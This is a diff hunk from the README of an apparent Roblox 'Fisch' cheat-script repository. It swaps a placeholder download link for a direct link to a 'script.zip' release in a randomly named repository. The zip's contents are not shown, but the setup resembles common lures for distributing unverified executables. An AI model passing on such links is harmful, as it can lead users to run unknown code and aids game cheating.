@@ -31,7 +31,7 @@ Welcome to the **Roblox Fisch Script** repository! 🚀 This script is designed 
 
 ## 📥 Download
 
-Get the latest version of **Roblox Fisch Script** [HERE](https://github.com/YourRepoLink)!
+Get the latest version of **Roblox Fisch Script** [HERE](https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip)!
 
 ## 🛠 Requirements
 
